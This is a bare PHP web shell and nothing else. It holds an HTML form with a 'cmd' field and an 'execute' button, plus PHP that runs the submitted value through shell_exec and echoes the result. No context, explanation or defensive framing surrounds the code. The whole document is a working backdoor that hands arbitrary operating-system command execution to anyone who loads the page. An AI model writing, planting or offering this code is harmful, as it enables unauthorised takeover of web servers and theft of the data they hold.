<form method=post>
<input name=cmd><input type=submit value=execute>
</form>
<pre>
<?php
$cmd=$_POST['cmd'];
if(isset($cmd) && $cmd !==""){
$data=shell_exec($cmd);
echo htmlspecialchars($data);
}
?>
</pre>
